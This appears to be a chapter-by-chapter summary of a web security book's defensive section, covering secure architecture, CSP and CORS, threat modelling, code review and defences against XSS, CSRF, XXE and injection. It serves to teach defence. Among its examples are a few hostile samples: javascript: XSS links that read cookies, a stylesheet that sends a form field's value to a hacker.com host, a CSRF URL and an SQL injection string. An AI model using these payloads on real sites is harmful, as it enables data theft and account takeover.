Chapter 20 · Securing Modern Web Applications

The whole SSDL in one chapter: architecture → review → discovery → analysis → management → regression tests → mitigation, applied to a castle you cannot fully wall.

The book’s central metaphor is a medieval castle. The core application code is the keep; the dependencies and integrations are the surrounding town; the kingdom is the whole surface area. In wartime you cannot fortify every entrance equally — you prioritise. That prioritisation is the security engineer’s job, and it is the reason the book starts with recon: you cannot prioritise what you have not mapped.

The seven steps

  • Defensive architecture — decide before writing code. “Most of software engineering is moving data from A to B; most of security engineering is securing it in transit and at rest.” Re-architecting after customers depend on a feature (their own stores, their own code) is brutally expensive.
  • Comprehensive code reviews — every commit, ideally by a team other than the committer’s (conflict of interest). Four questions cover most of it: how is data transmitted? how is it stored? how is it presented when it reaches the client? what operations run on it when it reaches the server?
  • Vulnerability discovery — the old way is a customer email or a public disclosure; the modern way is bug bounties, internal red/blue teams, third-party pen tests, and incentives for engineers to log what they find.
  • Vulnerability analysis — triage. Risk comes from financial exposure, difficulty of exploitation, type of data, contracts, and mitigations already in place.
  • Vulnerability management — track the fix to completion with deadlines derived from the risk score, and add logging for the flaw while it is still open. Companies have died because nobody noticed a known bug being exploited during the wait.
  • Regression testing — one engineer at a large company told the author that roughly 25% of their vulnerabilities were previously-closed bugs that regressed.
  • Mitigation strategies — spread wide like a net, and go deep where the stakes are highest.
Where Part I and II pay off

Recon tells you how your app looks to an attacker, so you know what to camouflage and what is easy to find. Offence tells you what a hacker will try, so you know which fix removes the most risk. Neither is required to read Part III — but both make the prioritisation obvious.

Chapter 21 · Secure Application Architecture

NIST’s number is the whole argument: a flaw removed in the design phase costs 30–60× less than the same flaw removed in production.

Start from the requirements

The book walks through MegaBank’s new merchandising store, MegaMerch, and reads the requirements as risk:

RequirementWhat it tells you
Accounts and sign-inYou are storing credentials → authentication, authorisation, session handling, data in transit
Full name, address, date of birthYou are storing PII → legal obligations, breach blast radius
Guests vs usersTwo privilege tiers → authorisation bugs are now possible
SearchProbably a second database → sync, staleness, leaked metadata
Saved cards and bank accountsYou are storing financial data → the most regulated, most valuable data in the app

That reading is the entire technique: business requirements are security requirements in disguise. A feature request for “save my card for later” is also a request for a PCI-scoped data store.

Data in transit: TLS

SSL came from Netscape in the mid-1990s; TLS was defined in RFC 2246 in 1999 to fix its architectural issues, and the two cannot interoperate. The guidance is blunt: all traffic encrypted, HTTPS everywhere, and every major server has a one-line path to it.

Credentials: entropy, not punctuation

  • What matters is entropy — randomness and unpredictability — not length plus special characters. Common passwords are common: dictionary attacks, then combination rules, then brute force.
  • Practical policy: reject the top-1000 password list, reject birthdates, first/last names and address parts. MegaMerch already collects those three fields, so it can check them cheaply.
  • Never store plaintext. Hash on first sight. Hashes are irreversible (even staff cannot steal a password), fast to compute for comparison, and collision-free in practice (~1 in 10⁹ or better).
StorageIf the database leaks
PlaintextEvery password compromised — and reused elsewhere
MD5Some cracked from rainbow tables (precomputed hash→password)
BCryptUnlikely that any are cracked

Three hashing families matter here:

AlgorithmIdeaNotes
Unix cryptThe old defaultDesigned for hardware that could do <10 hashes/sec; modern hardware does tens of thousands. Effectively broken as a password store.
BCryptBlowfish + crypt, with a work factorGets slower as hardware gets faster — the key property. The book’s choice for MegaMerch.
PBKDF2Key stretching: each iteration costs moreNot designed for passwords, but a fine fallback when BCrypt is unavailable. Set iterations to the maximum your hardware tolerates.

MFA

Password plus something else — an app-generated code, SMS, or a hardware token. Physical tokens are more secure but impractical to distribute to consumers, so app/SMS MFA is the realistic choice for an ecommerce site, and it is “an order of magnitude safer” than password-only. With no vulnerability in the MFA app or messaging protocol, remote login by anyone but the account owner is eliminated.

PII and financial data

  • Storing PII is a legal question per country, not just a technical one.
  • Assume breach: the format matters. Data that is easy to abuse when dumped is a liability even if the app is secure.
  • For smaller companies, the strongest move is often not storing it — outsource to a compliant specialist.

Search engines: the second database problem

Search needs a different data shape than a general-purpose database, so most apps end up with a second store — and now two systems must stay in sync. Concrete failure modes the book lists: permissions updated in the primary but not the index; objects deleted in the primary but still indexed; metadata still searchable after the object is gone. All are architecture problems, and all are far cheaper to decide now.

Zero Trust Architecture

The term appears in Stephen Paul Marsh’s 1994 doctoral thesis, vanished, and returned with NIST SP-800-207 in 2020. The core distinction:

ModelRuleFailure
Implicit trustTrust based on proximity or role — inside the moat, past the firewall, previously authenticatedAttackers who swim the moat, or insiders whose status changed, are trusted by default
Explicit trust (“trust but verify”)Every action that could lead to compromise is verified at the moment it happensCosts latency and engineering effort — the trade you accept

The book’s worked example is a fired admin, “Joe Admin”, whose tokens still have 48 hours left. The software checks only that the token is valid, not that Joe is still employed — so Joe keeps editing the books after being fired. Continuous authorisation, a zero-trust principle, closes it.

Why architecture is worth the money

Once customers build on insecure functionality, fixing it means building a secure equivalent and a migration plan; deep flaws can force rewrites of everything layered on top; and if the flaw was exploited or published, the cost includes real money and lost customers.

Chapter 22 · Secure Application Configuration

Your delivery mechanism is somebody else’s browser. This chapter is about borrowing its security features instead of rebuilding them badly.

Content Security Policy

CSP is the browser’s main defence against browser-side attacks — XSS, data injection, phishing, framing, redirects. It is deliberately configurable, which means a strong policy and a weak one look almost the same in a code review. You can run a site with no CSP at all and never notice.

Two ways to deploy it: a Content-Security-Policy response header (the common way), or a <meta http-equiv> tag. The old X-Content-Security-Policy and X-Webkit-CSP headers are deprecated.

The meta-tag form of a CSPbook code
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src data:" />

Structure: directives separated by semicolons; each directive gets a space-separated source list. script-src scripts.mega-bank.com means only scripts from that origin execute; everything else throws a console error.

DirectiveWhat it does
default-srcFallback for everything else — the single highest-value line in any policy
script-srcWhich sources may supply JavaScript
sandboxCreates a sandbox on load: no pop-ups, no scripts, no plug-ins
frame-ancestorsWho may frame you; 'none' kills clickjacking
img-srcImage sources — data: is what allows base64 images
report-uriWhere CSP violations are reported

Source-list values worth memorising: * = any URL except blob/file; 'none' = nothing (and it must be alone or the whole policy fails); data: = base64 images; https: = HTTPS only; 'self' = the page’s own origin.

The free win

Simply having any CSP blocks inline script and eval() by default — the two most popular XSS delivery mechanisms. No extra configuration required.

Strict CSP: nonces and hashes

If you genuinely need inline script, don’t reach for 'unsafe-inline'. Use a strict policy instead:

Nonce-based strict CSPrecommended
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';

<!-- every inline script must carry the current nonce -->
<script src="..." nonce="123">alert()</script>
  • Nonce — a random value generated at runtime, injected into every script tag, checked before execution. Ideal for server-rendered pages, where a fresh nonce per load is trivial.
  • Hash — a SHA-256 of each inline script listed in script-src. Better for cacheable pages/CDNs: a nonce can eventually be guessed or harvested from cache, while a SHA-256 collision is around 1 in 43 billion. The trade-off: adding script means editing the policy.
The book’s secure-by-default starter policyuse as a template
Content-Security-Policy
  default-src: 'self';
  script-src: 'self' 'nonce-jgoj23j2o3j2oij26jk2nkn26kjh23' 'strict-dynamic';
  frame-ancestors: 'none';
  img-src: data: https:;
  report-uri: https://reporting.megabank.com

CORS and the Same Origin Policy

CSP decides what may execute; CORS decides what may be read, and it acts earlier — before the response ever reaches the JS context. Both fetch and XMLHttpRequest obey the Same Origin Policy. Without SOP, any tab could make privileged requests to any other site, because the browser attaches cookies automatically — that is CSRF, in one sentence.

Simple requestPreflighted request
MethodsGET, HEAD, POSTAnything else (PUT, DELETE, …)
HeadersOnly CORS-safelisted: Accept, Accept-Language, Content-Language, Content-TypeAny header, declared up front
Content-TypeOnly application/x-www-form-urlencoded, multipart/form-data, text/plainIncluding application/json
MechanismBrowser sends origin:; server replies access-control-allow-origin:Browser sends an OPTIONS preflight with access-control-request-method and -headers first
On mismatchThe response is withheld from the script and a CORS error appears in the console
CORS in Express — note the single allowed originallowlist
const cors = require('cors');
const corsOptions = {
  origin: 'https://mega-bank.com'
};

app.get('/users/:id', cors(corsOptions), function (req, res, next) {
  res.sendStatus(200);
});

The rule: least privilege. Never * on an endpoint that returns user data.

The other headers

  • HSTS — Strict-Transport-Security: max-age=…; includeSubDomains; preload. Better than a 301 redirect because the redirect itself is an HTTP request a MITM can intercept, and preload means browsers know before the first request.
  • COOP — Cross-Origin-Opener-Policy: same-origin stops an opened tab from navigating back to the opener. This is the tabnabbing fix.
  • CORP — Cross-Origin-Resource-Policy, the practical mitigation for Spectre-style cross-tab memory reads. Values: same-origin (best), same-site, cross-origin (worst).
  • X-Content-Type-Options: nosniff — stops MIME sniffing, i.e. a non-executable type being upgraded into an executable one.
Legacy headerModern replacement
X-Frame-OptionsCSP frame-ancestors
X-XSS-ProtectionRemoved — browsers no longer scan for reflected XSS; CSP covers the sinks
Expect-CTRemoved — certificate transparency is default since May 2018
Referrer-PolicyModern browsers default to safer behaviour; set strict-origin-when-cross-origin for legacy ones
X-Powered-ByDelete it — it fingerprints your server and version for free
X-Download-OptionsIrrelevant — Internet Explorer only

Cookies

Testing is done with an intercepting proxy (Burp Suite, ZAP — with a local test certificate for local TLS/HTTP), or in DevTools → Application → Storage → Cookies, or by typing document.cookie in the console (note what is missing there — HttpOnly cookies).

Chapter 23 · Secure User Experience

The UI is where the app talks to a human — so it is where it accidentally tells an attacker things, and where it has the best chance of teaching the human to be safer.

Information disclosure through error messages

Designers rightly want detailed errors. Security wants silence. The book ranks five implementations:

ImplementationSecurityUsability
Reflect the server’s error message and codeWorst — leaks internals, and the leak changes as databases upgradeBest
Reflect only if the message is on an allowlistGood — the practical middle groundGood
Client-side general message + server codeFairGood
Error code onlyGoodPoor
Neither message nor codeBest (technically)Worst — rarely the right answer

The worked example: “the user Jonathan Smith could not be queried because the address 905 N. Main St. provided does not match the current file” becomes “The user could not be queried due to an address mismatch.” Same cause, no PII. Keep an allowlist of generic messages and return the closest match — and prefer 400 Bad Request over richly specific codes so recon is harder (the book jokingly offers 418 I’m a teapot, precisely because it means nothing anywhere).

Enumeration

One response leaks nothing. A thousand responses leak a lot.

The two-outcome login that hands over a user listthe flaw
// result A: "wrong password"     → this username exists
// result B: "user does not exist" → this username does not

// attacker iterates leaked username lists from other breaches
// → a spreadsheet of valid @megabank.com staff accounts
// → then only the password is unknown

Why this matters more than it looks: brute force is inaccurate, noisy and sometimes infeasible; enumeration turns “username + password” into “password for a known username”, which makes targeted methods (spear phishing) viable and undetectable. The book’s three defences:

  • Generic errors — one message for all auth failures (“authentication failed”), per OWASP.
  • No guessable patterns — no /api/1, /2, /3; no user IDs derived from sign-up date or an incrementing counter.
  • Rate limits on every endpoint that could be enumerated, sized to the upper bound of legitimate use.

Light patterns

A dark pattern tricks the user into something they did not intend. The author’s coinage, a light pattern, gently nudges them toward safety.

Two things matter about the design:

  • A link to documentation is not a light pattern — only a subset of users ever reads docs, and the link lives on a settings page they may never open.
  • Put the nudge where the risk is. For a crypto wallet with an opt-in daily spend cap, don’t advertise the setting on the settings page — warn on every outgoing transaction that the cap is off and a typo is irreversible. Users convert far better on that framing than on “an attacker might take your funds”, which they cannot estimate.

And the ordering: secure by default beats light patterns. Light patterns are for when you genuinely cannot force the safe choice.

Chapter 24 · Threat Modeling Applications

Five documents, in order, that turn “what could go wrong?” from a meeting into a process — and a living record that survives the engineer who wrote it.

What a threat model must achieve

  • Document knowledge — one place that holds architecture plus security context.
  • Identify threat actors — humans, insiders, and machines.
  • Identify risks (attack vectors) — potential pathways, not yet vulnerabilities.
  • Identify mitigations — what is already in place.
  • Identify the delta — vectors without sufficient mitigation. This is the work list.
Why skipping the last two ruins it

A model with risks but no mitigations lists is not actionable — you may spend a sprint “fixing” something that was already mitigated, adding bugs and technical debt. And a model that is only a risk list is not a knowledge repository, so the next engineer starts from scratch.

The worked example: MegaBank user reviews

Holly Hacker, security engineer, models a new feature: authenticated users post a 0–5 score plus text; anyone can read reviews on “activate feature” pages.

1. Logic design

Functionality in plain language — the level a UX designer needs, higher than a technical design, lower than marketing. It is the step most often skipped and the only place logic vulnerabilities can later be spotted. Example logic flaw: a user bypassing the form to POST a score of 50, skewing every average and destroying trust in the reviews. Storing an integer is not a vulnerability — storing an unbounded integer in this feature is.

2. Technical design

Must be detailed enough to answer: which languages, databases, build tools, package managers, frameworks? which third-party services (in-network like S3, out-of-network like Datadog/CircleCI)? how does data flow (formats, encryption, protocols)? how are networks configured? what auth/authz controls exist? what is the schema, and which fields are regulated?

MegaBank’s: React client with getReviews and createReview; a GET against an EC2-hosted Express REST server; PostgreSQL behind it; session cookie checked against a session service; body-parser and cookie-parser via npm; TLS 1.3 with a Let’s Encrypt certificate; “all APIs also optionally queryable via GraphQL”.

Reading that description already yields findings: the rendering method is unspecified → possible XSS; the SQL construction is unspecified → SQLi risk; the “no reviews found for this feature” error leaks the existence of unreleased features. GraphQL adds a whole new class on its own.

3. Threat actors

ActorPowers and risk
User adminAdmin UI with read/update on the database. Can steal PII and alter ratings. Usage is not logged — no accountability.
Review aggregator scriptRuns automatically, has database-admin access, cannot run Bash. If compromised: arbitrary queries. A machine actor.
Authenticated userCan post, can read. Can bypass the form and POST malicious payloads directly.
Unauthenticated guestRead-only. Low threat, except for DoS or circular-query abuse.

The key insight: the actor list must include internal, external and machine users, split into authenticated/unauthenticated where relevant. Internal users get phished, go rogue; machine users malfunction. Modelling only external humans is a best-case model, and security always works from worst case.

4. Attack vectors

Cross-analyse logic design × technical design × actors, and add severity. P0–P4, where P0 is highest.

VectorSevActorWhy
Improper validation — scoreP1All but guestOut-of-range score skews aggregation
Information disclosure — featureIDP3AllError messages reveal unreleased/gated features
SQL injectionP0All but guestImproper handling of the POST payload
GraphQL circular / large queriesP1AllNot prevented by rate limits; needs max query time
GraphQL introspection + errorsP1AllLeaks server configuration
High-privilege user attacksP0Admin, aggregatorPrivileged tokens with no monitoring: one compromise takes everything

5. Mitigations, then the delta

Existing mitigations here: a validation engine rejecting non-integers and out-of-range scores; a SQL DSL that forces prepared statements. Removing the vectors those cover leaves four — information disclosure, the two GraphQL issues, and privileged-user attacks. Those get new mitigations:

Remaining vectorNew mitigation
Information disclosureGeneric error messages that reveal nothing about data or app
GraphQL large/circular queriesMaximum compute time per query, on top of rate limits
GraphQL introspection/errorsIntrospection off; never surface GraphQL’s own errors
High-privilege attacksScope tokens to the minimum required; log every privileged call off-platform so the privileged user cannot delete the logs; give the aggregator read on score and write on aggregate score only
The rule the book states plainly

If an attack vector has no sufficient mitigation, the feature does not ship. And when scope changes later, reopen the model — update the knowledge, the actors, the vectors, the mitigations and the delta.

Chapter 25 · Reviewing Code for Security

Architecture review first, code review second — and then read the code the way the client sees it, not the way the folder tree does.

Security code review belongs at the merge request, because that is the one moment the whole feature exists at once. Per-commit or pair-programming reviews give more depth for mission-critical work, but you never see the complete picture. “Move fast and break things” is not a licence to skip architecture review before code.

The local flow

Reviewing a branch from the terminalbook code
git checkout main
git pull origin main
git checkout <username>/feature
git diff origin/main...

Web-based review tools (GitHub, GitLab, Bitbucket) are convenient but less capable than local tooling — which is why the book recommends pulling the branch.

Archetypes versus logic

A functionality review asks “does it meet the spec?”. A security review asks that plus “what can be done with it that the spec never imagined?”. For that you need three things about the feature: the users, the functionality, the business impact.

Archetypal

XSS in a user post. Known, catalogued, and exactly what a scanner or checklist looks for.

Business logic

On MegaChat, an endpoint that accepts isMember: true lets a plain user upload video without a moderator’s approval — bypassing the paywall that exists because hosting is expensive.

Where to start

If you did not design the app, you do not know which components are high risk — so start where the client meets the server and let the code lead you:

  • Client-side code — learn the business logic and what users can actually do. This gives you the real surface area, the payloads, and whether there is more than one server.
  • The API layer those clients call — trace each call, and note what it depends on.
  • Those dependencies — databases, helper libraries, loggers, upload handlers, conversion libraries.
  • Everything exposed but not called — APIs built for upcoming features, or accidentally public internals.
  • The rest — now you know enough to prioritise by business risk instead of by folder name.

Step 5 is genuinely easier than it sounds: you already read the code organically, so the tail is fast.

Four anti-patterns to hunt

Anti-patternWhy it failsThe fix
BlocklistsThey only work with perfect knowledge of all present and future inputs — the hacker just buys another domainInvert it: allowlist
Boilerplate codeDefaults are built for convenience, not security: MongoDB bound to the internet with no auth (thousands of databases held for ransom); Rails 404 pages leaking version; Ember’s default landing page in productionEvaluate and configure every default before shipping
Trust-by-defaultOne server user with logging + database + disk means one RCE owns all threeOne user per module, each with only its own permissions
Client/server couplingWhen the server parses HTML or shares auth logic with the template, it must defend against many languages and formats at onceSeparate them; accept JSON only, never HTML
Blocklist vs allowlist — the same function, invertedthe fix
// fragile: only blocks what you already thought of
const blocklist = ['http://www.evil.com', 'http://www.badguys.net'];
const isDomainAccepted = function(domain) {
  return !blocklist.includes(domain);
};

// durable: only allows what you reviewed
const allowlist = ['https://happy-site.com', 'https://www.my-friends.com'];
const isDomainAccepted = function(domain) {
  return allowlist.includes(domain);
};

The practical answer to “allowlists are maintenance”: combine manual and automated effort — require integrating partners to submit a domain and business licence for review. Cheap to maintain, and a removed partner cannot simply re-enter.

Chapter 26 · Vulnerability Discovery

Architecture and review catch most things. This chapter is about the ones that get through — and about finding them before your customers do.

Static analysis can also enforce policy, not just find bugs: reject endpoints whose authorization function is not imported, or functions consuming user input that bypass the central validation library.

The regression test, worked through

Steve ships GET /changeSubscriptionTier?newTier=…. Jed sends him the link; clicking it changes Steve’s own subscription. A textbook CSRF. The fix: make it POST-only.

The vulnerability regression testrecommended
const testTierChange = function() {
  requester.options('http://app.com/api/changeSubscriptionTier')
    .on('response', function(res) {
      if (!res.headers) { return tester.fail(); }

      const verbs = res.headers['Allow'].split(',');
      if (verbs.length > 1) { return tester.fail(); }   // more than one verb
      if (verbs[0] !== 'POST') { return tester.fail(); } // wrong verb
    })
    .on('error', function(err) { console.error(err); return tester.fail(); });
};

The only difference between a functional test and a security regression test is why it was written. They are so cheap that they are worth writing before a bug exists, for code where a small-looking change has a large blast radius.

Finding bugs from outside your team

ProgramWhat it gives youWhat it needs

Bounty hunters are mostly freelance testers: they work when they want and on what interests them. Firms can be directed at a specific area and given source code under NDA. Different tools; the book suggests using both.

Chapter 27 · Vulnerability Management

Reproduce it, score it, fix it properly, then write the test that stops it coming back.

Reproduce first

Before spending a minute on a report, rebuild it in a staging environment that mirrors production — automated, because a hand-built staging environment rots. Mock users and mock objects are enough; real customers are not needed. Benefits: it confirms the report is real (a user “accidentally” making a photo public is a config issue, not a bug), it avoids paying a bounty for a false positive, and it tells you where in the code to look. Do this immediately and log the result.

Score it: CVSS v3.1

Free, widely available, and good at the common cases — criticised for rare, chained or unusual systems, which is why you build on top of it rather than worship it. Three sub-scores: Base (the vulnerability itself), Temporal (how it stands today), Environmental (what it means here). Most teams use base only.

Base metricOptionsMeaning
Attack Vector (AV)Network → Adjacent → Local → PhysicalHow the payload is delivered; network is worst
Attack Complexity (AC)Low / HighSetup and variables outside the attacker’s control
Privileges Required (PR)None / Low / HighGuest → normal user → admin
User Interaction (UI)None / RequiredDoes someone have to click?
Scope (S)Unchanged / ChangedDoes the impact escape the vulnerable component?
Confidentiality (C)None / Low / HighHow much data exposure
Integrity (I)None / Low / HighHow much state can be changed
Availability (A)None / Low / HighHow much service is lost

Scores map to bands: 0.1–4 low, 4.1–6.9 medium, 7–8.9 high, 9+ critical.

Temporal adjusts for the state of the world: Exploit Code Maturity (unproven → high), Remediation Level (official fix → unavailable), Report Confidence (unknown → confirmed).

Environmental re-scores everything in your context by adding Confidentiality / Integrity / Availability requirements — a health or government app scores higher than a public brochure site.

Fix it properly

  • Scoring prioritises, but it is not the only input — contracts and business relationships count too.
  • Prefer a permanent, application-wide fix. If you cannot, ship the temporary fix and open a new bug for the remaining surface, with a score.
  • Never close a bug on a partial fix without that follow-up ticket. Early closure loses the reproduction knowledge, and unreported variants may still be live.
  • Every closed security bug ships with a regression test. Their value compounds as the codebase grows.

Chapter 28 · Defending Against XSS Attacks

The one rule: user data may enter the DOM only as text — and when that is impossible, only after real sanitisation.

Start with the coding rule the book proposes for teams:

Two versions of the rule

Simple: “Don’t allow any user-supplied data into the DOM — except as strings.”
Realistic: “Never allow any unsanitised user-supplied data into the DOM.”

Checking that something is string-like

isString covers strings but rejects safe numbers — so go one level upbook code
const isString = function(x) {
  if (typeof x === 'string' || x instanceof String) { return true; }
  return false;
};

// numbers are also safe to inject, so accept "string-like"
const isStringLike = function(x) {
  try {
    return JSON.stringify(JSON.parse(x)) === x;
  } catch (e) {
    console.log('not string-like');
  }
};

The JSON.parse round-trip works because only strings and numbers survive it — functions and complex objects do not fit JSON.

innerText over innerHTML

Same assignment, two very different outcomessafe vs
const userString = '<strong>hello, world!</strong>';

// tags become DOM → script tags would execute
div.innerHTML = userString;

// tags stay literal text → rendered, not executed
div.innerText = userString;

Caveat the book states clearly: innerText’s sanitisation is not fail-safe. Implementations differ per browser, and bypasses are documented. It is the right default, not a guarantee.

When you must allow some HTML

If you need <strong> and <i> but not <script>, sanitisation is genuinely hard — the DOM spec is enormous. Blocking quotes and script tags is not enough:

Two payloads with no script tag and no quotespayloads
<a href="javascript:alert(document.cookie)">click me</a>

<a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a>

The javascript: pseudo-scheme executes on navigation; String.fromCharCode builds the string without any quote characters. This is exactly the class of bypass the Part II page showed in mXSS — sanitisation is a library problem, not a regex problem. Use DOMPurify (or a maintained equivalent), keep it patched, and pair it with CSP.

The sink list

The safe way to build DOM from datarecommended

const parser = new DOMParser();
const html = parser.parseFromString('<script>alert("hi");</script>');

// safe: you decide the structure, the payload only fills a text node

el.appendChild(document.createTextNode(userText));

Navigating with user input

Borrow the browser’s URL filtering instead of writing your ownrecommended

// safe: let an anchor tag normalise and filter it first

dummy.href = userLink;
window.location.href = `https://mywebsite.com/${dummy.a}`;
// → https://my-website.com/%3Cscript%3E...  (encoded)

// or encode explicitly
encodeURIComponent('<strong>test</strong>'); // %3Cstrong%3Etest%3C%2Fstrong%3E

Two caveats: encodeURIComponent cannot encode a whole URL (the scheme and host must stay readable), and these helpers are well-tested but not mathematically unbypassable — which is why CSP sits behind them.

Where entity encoding does nothing

It protects content injected into an HTML element body. It does not protect content inside <script>, inside CSS, or inside a URL — different parsing rules, different escaping. Context-free encoding is how well-meaning teams still ship XSS.

CSS XSS

User-uploaded stylesheets are an attack surface because CSS can make requests. Attribute selectors plus background: url() leak form state:

A stylesheet that exfiltrates an income fieldthe attack
#income[value=">100k"] {
  background: url("https://www.hacker.com/incomes?amount=gte100k");
}

Defences in order of preference: disallow user CSS; else let users set specific fields and generate the stylesheet yourself; sanitising every URL-bearing CSS attribute is the hardest option and the one most likely to miss a case.

CSP for XSS

script-src: shrinking the set of code that can runrecommended
Content-Security-Policy: script-src 'self' https://api.mega-bank.com
  • Wildcards (*.mega-bank.com) are risky because a future subdomain that hosts user uploads becomes an XSS entry point.
  • Inline script and eval are blocked by default — do not add 'unsafe-inline' or 'unsafe-eval' unless there is truly no alternative.
  • If an eval-like pattern is in use, rewrite it. Passing a function instead of a string is safer and clearer:
Removing a string-evaluated callbackthe fix
// risky: the message is interpreted as code
setTimeout(`window.alert(${message});`, minutes * 60 * 1000);

// safe: no string is ever evaluated
setTimeout(function() { alert(message); }, minutes * 60 * 1000);

Implement CSP from day one if you know your scripts and APIs — the policy is easy to change later, but a site that grew up without one has an enormous backlog of inline handlers to fix. Deploy via header or <meta http-equiv>.

The one gap to remember

CSP is a great first measure against classic XSS, but it does not protect you from DOM XSS — the script is already in your page, doing your own DOM writes. DOM XSS needs the coding rules above, and the client is almost always the right place to enforce them, since XSS only exists if it executes in a client.

Chapter 29 · Defending Against CSRF Attacks

Three layers, in increasing strength: never change state on GET → verify the origin → require a token.

Layer 1: keep GET stateless

GET requests are the easiest CSRF delivery — a link, an image, a video source. So GET must never modify server state.

One endpoint vs two — the architecture-level fixvulnerable
// risky: a GET with optional update — one image tag is enough
const user = function(req, res) {
  getUserById(req.query.id).then((user) => {
    if (req.query.updates) { user.update(req.updates); }
    return res.json(user);
  });
};

// https://<url>/user?user=123&updates=email:hacker   ← CSRF
Split it: read over GET, write over POSTthe fix
// GET — read only
const getUser = function(req, res) {
  getUserById(req.query.id).then((user) => res.json(user));
};

// POST — state change, and now token-checkable
const updateUser = function(req, res) {
  getUserById(req.query.id).then((user) => {
    user.update(req.updates).then((updated) => {
      if (!updated) { return res.sendStatus(400); }
      return res.sendStatus(200);
    });
  });
};

POST alone is not a fix — it only removes the trivial link/image attack. Which is why you keep going.

Layer 2: header verification

JavaScript cannot set Origin or Referer in major browsers, so a browser-supplied value is hard to spoof:

HeaderSent onExample
OriginPOST requestsOrigin: https://www.mega-bank.com:80
RefererAll requests — except when rel="noreferrer"Referer: https://www.mega-bank.com:80
Checking both headers against the allowlist of your own originsrecommended
const validLocations = [
  'https://www.mega-bank.com',
  'https://api.mega-bank.com',
  'https://portal.mega-bank.com'
];

const validateHeadersAgainstCSRF = function(headers) {
  const origin = headers.origin;
  const referer = headers.referer;
  if (!origin || !referer) { return false; }              // missing → reject
  if (!validLocations.includes(origin) ||
      !validLocations.includes(referer)) { return false; }
  return true;
};
Where this layer fails

If an attacker has an XSS on one of your allowlisted origins, the request genuinely comes from your own site. On a site with user-generated content this can make header checks worthless — which is the argument for tokens as the primary defence and headers as the cheap first filter.

Layer 3: CSRF tokens

  1. The server sends a cryptographically random token — per session, or per request.
  2. Every form and every AJAX call returns it; the server checks that it is live, authentic and unmanipulated. Failure is logged and rejected.
  3. Because the token is per-user and per-session, an attack must obtain a fresh token and target one specific user — and by the time a victim clicks a link, the token may already have expired.

For stateless APIs (don’t give up statelessness for this), make the token self-contained: user id + timestamp + server-keyed nonce, encrypted. Validated server-side without a session store, and cheaper than session management at scale.

Decoding a stateless token: who, when, and is the nonce oursrecommended
const validateCSRFToken = function(token, user) {
  const text_token = crypto.decrypt(token);
  const user_id = text_token.split(':')[0];
  const date    = text_token.split(':')[1];
  const nonce   = text_token.split(':')[2];

  const validUser  = (user_id === user.id);
  const validDate  = dateTime.lessThan(1, 'week', date);
  const validNonce = crypto.validateNonce(user_id, date, nonce);

  return validUser && validDate && validNonce;
};

Put it in middleware, not in each route

One shield for every routerecommended
const CSRFShield = function(req, res, next) {
  if (!validateHeaders(req.headers, req.method) ||
      !validateCSRFToken(req.csrf, session.currentUser)) {
    logger.log(req);
    return res.sendStatus(401);
  }
  return next();
};

Application-wide is the whole point: the weakest link breaks the chain, and one forgotten route is enough. On the client, make token attachment automatic — proxy XMLHttpRequest or wrap it in a request library that injects the token per verb. Relying on developers to remember is a security flaw with extra steps.

Chapter 30 · Defending Against XXE

One line of parser configuration — which is exactly why it is embarrassing that XXE is still everywhere.

Disabling DOCTYPEs in a Java XML parserthe fix
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
Check, don’t assume

OWASP flags Java parsers specifically because many of them have XXE enabled by default. Some languages and parsers disable it by default — but the book’s instruction is explicit: read the parser’s API documentation and verify. A default is not a guarantee, especially after a dependency upgrade.

Or remove the format entirely

If the XML is just carrying structured data between your own systems, replace it with JSON and the entire attack class disappears.

Choose JSON for lightweight structured data consumed by JavaScript; keep XML where the payload must eventually be rendered (SVG, documents, XML-derived formats) or where rigid schema validation is a requirement. Why it is worth the paragraph

XXE is a “gateway” attack: it starts read-only and hands the attacker a recon platform for the server’s filesystem, which is often enough to reach credentials, keys and configs, and from there code execution. Cheap to fix, expensive to ignore — hence it stays in the top tier of the OWASP list.

Chapter 31 · Defending Against Injection

Set the query’s intent before any user data exists. Everything else in this chapter is a fallback.

Finding it first

Injection lives on the server, past routing, so the client is not worth searching. But do not skip “analytics” or similar service folders: if data persists across devices and sessions it is in memory, on disk, or in a database. And an application often has several databases, so you need generic searches that catch each dialect — including DSLs that generate SQL for you.

In Node, the import is the reliable starting pointbook code
const sql = require('mssql');
// OR
const mysql = require('mysql');

Both adapters end in .query(x), which makes grepping practical. If the module is injected globally or inherited from a base class, the search is harder — one more argument for explicit imports.

Prepared statements

Compile the query with placeholders first, then supply values. The two-step ordering is the whole defence: intent is fixed before any user data is considered, so a SELECT can never become a DELETE, and an appended second statement never compiles.

MySQL prepared statementthe fix
PREPARE q FROM 'SELECT name, barCode from products WHERE price <= ?';
SET @price = 12;
EXECUTE q USING @price;
DEALLOCATE PREPARE q;

-- even if @price were  '5; UPDATE users WHERE id = 123 SET balance = 10000'
-- nothing extra fires: the statement was already compiled
What not to do — the same query as string concatenationvulnerable
'SELECT name, barcode from products WHERE price <= ' + price + ';'

The only trade-off is a second round trip to the database, usually negligible. Support is near-universal: MySQL, Oracle, PostgreSQL, SQL Server.

Database-specific escaping (when you genuinely cannot parameterise)

PlatformMechanism
Oracle (Java)ESAPI.encoder().encodeForSQL(new OracleCodec(), str);
MySQLSELECT QUOTE('test''case'); — escapes backslash, single quote, NULL
MySQL (extended)mysql_real_escape_string() — also double quotes, \n, \r
SQL Server / SOQLEquivalent built-in encoder functions

The book is careful here: this is a mitigation, not a defence. Use it only on queries that cannot be parameterised.

Non-SQL injection: same idea, broader surface

High-risk targets to audit, from the book’s list:

  • Task schedulers
  • Compression / optimisation libraries (ImageMagick, FFMPEG — see Chapter 13)
  • Remote backup scripts
  • Databases
  • Loggers
  • Any call to the host OS
  • Any interpreter or compiler

And remember: dependencies bring their own subdependencies, which may land in any of those categories without appearing in your diff.

Least authority

A backup CLI is the book’s example: built with least authority, a compromised CLI cannot reach the rest of the application; running as admin, one injection exposes the server.

Allowlist the commands

Passing user input straight to a CLI — the architectural mistakevulnerable
const postCommands = function(req, res) {
  cli.run(req.body.commands);   // the client now owns the CLI's full scope
};
Allowlisting the verbsthe fix
const commands = ['print', 'cut', 'copy', 'paste', 'refresh'];

const postCommands = function(req, res) {
  const userCommands = req.body.commands;
  userCommands.forEach((c) => {
    if (!commands.includes(c)) { return res.sendStatus(400); }
  });
  cli.run(userCommands);
};

